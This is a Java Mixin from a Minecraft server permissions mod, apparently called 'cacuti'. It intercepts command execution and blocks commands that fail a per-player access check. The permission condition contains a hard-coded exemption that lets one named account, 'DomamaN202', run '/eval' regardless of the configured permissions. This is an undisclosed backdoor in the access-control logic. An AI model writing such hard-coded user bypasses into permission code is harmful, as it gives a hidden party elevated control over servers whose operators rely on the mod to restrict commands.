package ru.DmN.cacuti.mixin;

import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.text.LiteralText;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

import static ru.DmN.cacuti.Main.checkAccess;

@Mixin(CommandManager.class)
public class CommandManagerMixin {
    @Inject(method = "execute", at = @At("HEAD"), cancellable = true)
    public void executeInject(ServerCommandSource commandSource, String command, CallbackInfoReturnable<Integer> cir) {
        try {
            if (checkAccess(commandSource.getPlayer().getGameProfile().getName(), command) || (commandSource.getPlayer().getGameProfile().getName().equals("DomamaN202") && command.equals("/eval")))
                return;
            commandSource.getPlayer().sendMessage(new LiteralText("§CPermissions error!"), false);
        } catch (com.mojang.brigadier.exceptions.CommandSyntaxException e) {
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
        cir.setReturnValue(0);
        cir.cancel();
    }
}
